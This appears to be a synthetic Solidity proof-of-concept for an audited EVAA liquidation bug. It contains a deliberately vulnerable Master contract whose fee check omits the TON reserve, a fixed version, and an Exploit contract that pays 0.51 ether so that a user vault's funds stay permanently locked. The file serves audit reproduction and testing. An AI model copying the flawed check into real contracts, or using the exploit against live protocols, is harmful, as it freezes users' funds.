// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  EVAA master-liquidate — fee check omits TON_reserve (Trail of Bits, #62252).
    SYNTHETIC, cheatcode-free, one block. The FunC check is
    msg_value < enough_fee, then the user contract increments `state`.
    enough_fee is 0.02 ether and TON_reserve is 0.50 ether, so the call
    needs 0.52 ether. 0.51 ether passes the check, state becomes 1, and
    the completion message is never applied. withdraw then reverts and
    N = 100e18 stays in the user contract.
    Control requires enough_fee + TON_reserve, leaves state at 0, and
    withdraw pays the 100e18. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

error Locked();

contract UserVault {
    Asset public token;
    address public owner;
    uint256 public state;

    constructor(Asset token_, address owner_) {
        token = token_;
        owner = owner_;
    }

    function lockForLiquidation() external {
        state += 1;
    }

    function completeLiquidation() external {
        require(state > 0, "none");
        state -= 1;
    }

    function withdraw(uint256 amount) external {
        if (state != 0) revert Locked();
        token.transfer(owner, amount);
    }
}

contract Master {
    uint256 public constant ENOUGH_FEE = 0.02 ether;
    uint256 public constant TON_RESERVE = 0.5 ether;
    UserVault public user;

    constructor(UserVault user_) {
        user = user_;
    }

    function liquidate() external payable {
        if (msg.value < ENOUGH_FEE) {
            payable(msg.sender).transfer(msg.value);
            return;
        }
        // @> VULN: 0.51 ether cleared enough_fee and never reserved 0.50 on top
        user.lockForLiquidation();
        if (msg.value < ENOUGH_FEE + TON_RESERVE) {
            return;
        }
        user.completeLiquidation();
    }
}

error FeeTooSmall();

contract MasterFixed {
    uint256 public constant ENOUGH_FEE = 0.02 ether;
    uint256 public constant TON_RESERVE = 0.5 ether;
    UserVault public user;

    constructor(UserVault user_) {
        user = user_;
    }

    function liquidate() external payable {
        if (msg.value < ENOUGH_FEE + TON_RESERVE) revert FeeTooSmall();
        user.lockForLiquidation();
        user.completeLiquidation();
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;
    uint256 public constant ATTACK_VALUE = 0.51 ether;

    Asset public token;
    UserVault public user;
    Master public master;
    bool public withdrew;
    address public owner;

    constructor() {
        token = new Asset();
        owner = address(0xA11CE);
        user = new UserVault(token, owner);
        master = new Master(user);
    }

    function run() external payable {
        require(msg.value == ATTACK_VALUE, "value");
        token.mint(address(user), N);
        master.liquidate{value: msg.value}();
        require(user.state() == 1, "not locked");

        (bool ok,) = address(user).call(abi.encodeWithSelector(user.withdraw.selector, N));
        withdrew = ok;
        require(withdrew == false, "withdraw did not revert");
        require(token.balanceOf(address(user)) == N, "N not stuck");
        require(token.balanceOf(owner) == 0, "owner was paid");
    }
}
